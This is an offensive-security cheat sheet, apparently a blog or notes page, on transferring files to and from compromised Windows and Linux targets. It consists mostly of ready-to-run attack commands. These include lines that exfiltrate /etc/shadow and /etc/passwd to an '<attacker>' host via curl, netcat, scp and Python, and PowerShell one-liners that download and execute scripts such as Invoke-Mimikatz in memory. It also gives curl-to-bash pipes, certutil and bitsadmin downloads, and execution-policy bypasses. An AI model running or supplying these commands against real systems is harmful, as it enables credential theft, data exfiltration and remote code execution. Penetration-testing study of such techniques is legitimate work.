+++
title = "File Transfers"
date = "2026-05-05T00:00:00-05:00"
tags = ["file-transfer", "windows", "linux", "exfil"]
description = "Uploading and downloading files to and from Windows and Linux targets using native tools, Python, SCP, SMB, and more."
draft = false
+++

## Attacker — Quick Servers

```bash
# HTTP server
python3 -m http.server 80
python3 -m http.server 443   # not HTTPS, just a different port

# SMB share (no auth)
impacket-smbserver share . -smb2support
impacket-smbserver share /path -smb2support -username user -password pass

# FTP server
python3 -m pyftpdlib -p 21 -w   # -w = writable

# Upload receiver (POST)
python3 -m uploadserver          # listens on 8000, /upload endpoint
```

---

## Linux — Download to Target

```bash
# wget
wget http://<attacker>/file -O /tmp/file
wget -q http://<attacker>/file -O /tmp/file   # quiet

# curl
curl http://<attacker>/file -o /tmp/file
curl -s http://<attacker>/file -o /tmp/file

# Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<attacker>/file','/tmp/file')"

# Bash /dev/tcp
exec 3<>/dev/tcp/<attacker>/80
echo -e "GET /file HTTP/1.1\r\nHost: <attacker>\r\n\r\n" >&3
cat <&3 > /tmp/file

# SCP (if SSH available)
scp user@<attacker>:/path/file /tmp/file

# From SMB share
smbclient //<attacker>/share -N -c "get file /tmp/file"
```

---

## Linux — Upload from Target

```bash
# SCP to attacker
scp /etc/passwd user@<attacker>:/tmp/

# curl POST (to uploadserver)
curl -X POST http://<attacker>:8000/upload -F 'files=@/etc/shadow'

# curl PUT
curl -T /path/to/file http://<attacker>/upload/

# nc transfer
# Attacker: nc -lvnp 9999 > received_file
cat /etc/shadow | nc <attacker> 9999

# Python HTTP POST
python3 -c "
import requests
r = requests.post('http://<attacker>:8000/upload', files={'files': open('/etc/shadow','rb')})
print(r.text)
"
```

---

## Windows — Download to Target

```powershell
# PowerShell — most reliable
Invoke-WebRequest -Uri http://<attacker>/file.exe -OutFile C:\temp\file.exe
iwr http://<attacker>/file.exe -o C:\temp\file.exe   # alias

# WebClient
(New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','C:\temp\file.exe')

# DownloadString (execute in memory — no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1')
IEX (iwr http://<attacker>/script.ps1 -UseBasicParsing)

# Download + execute one-liner
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/nc.exe','C:\temp\nc.exe')"

# certutil (old faithful)
certutil -urlcache -split -f http://<attacker>/file.exe C:\temp\file.exe
certutil -decode encoded.b64 decoded.exe   # base64 decode

# bitsadmin
bitsadmin /transfer myJob http://<attacker>/file.exe C:\temp\file.exe

# From SMB share (no download needed)
\\<attacker>\share\file.exe
copy \\<attacker>\share\file.exe C:\temp\

# Bypass execution policy
powershell -ep bypass -c "..."
powershell -ExecutionPolicy Bypass -File script.ps1
```

---

## Windows — Upload from Target

```powershell
# PowerShell POST (to uploadserver)
Invoke-WebRequest -Uri http://<attacker>:8000/upload -Method POST -InFile C:\path\file

# Or: multipart form-data
$form = @{ files = Get-Item C:\path\file }
Invoke-RestMethod -Uri http://<attacker>:8000/upload -Method Post -Form $form

# SMB — copy to share
copy C:\path\file \\<attacker>\share\

# nc — pipe file
nc.exe <attacker> 9999 < C:\path\file
# Attacker: nc -lvnp 9999 > received_file

# Base64 encode + copy-paste
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\file")) | clip
# Attacker: echo "<paste>" | base64 -d > file
```

---

## Base64 Transfer (Copy-Paste Safe)

```bash
# Linux — encode
base64 -w 0 file > file.b64
cat file.b64   # copy output

# Linux — decode
echo "<paste>" | base64 -d > file
```

```powershell
# Windows — encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file")) | Out-File file.b64

# Windows — decode
[IO.File]::WriteAllBytes("C:\file", [Convert]::FromBase64String((Get-Content file.b64)))
```

---

## Execute Without Disk Write

```powershell
# PowerShell — download and run script in memory
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')

# PowerShell — download and run PE from memory
$bytes = (New-Object Net.WebClient).DownloadData('http://<attacker>/tool.exe')
# (requires reflective loading — use tools like Invoke-ReflectivePEInjection)
```

```bash
# Linux — pipe directly to bash
curl -s http://<attacker>/script.sh | bash
wget -qO- http://<attacker>/script.sh | bash
```

---

## Verify File Integrity

```bash
# Linux
md5sum file
sha256sum file

# Windows
Get-FileHash C:\path\file -Algorithm MD5
Get-FileHash C:\path\file -Algorithm SHA256
certutil -hashfile C:\path\file MD5
```

---

## Quick Reference

| Method | Linux Download | Linux Upload | Windows Download | Windows Upload |
|--------|---------------|--------------|-----------------|----------------|
| HTTP | wget/curl | curl POST | iwr/WebClient | iwr POST |
| SMB | smbclient get | smbclient put | copy \\share\ | copy to \\share |
| SCP | scp | scp | — | — |
| nc | nc redirect | nc pipe | nc.exe redirect | nc.exe pipe |
| base64 | base64 -d | base64 | FromBase64String | ToBase64String |
| certutil | — | — | certutil -urlcache | certutil -encode |
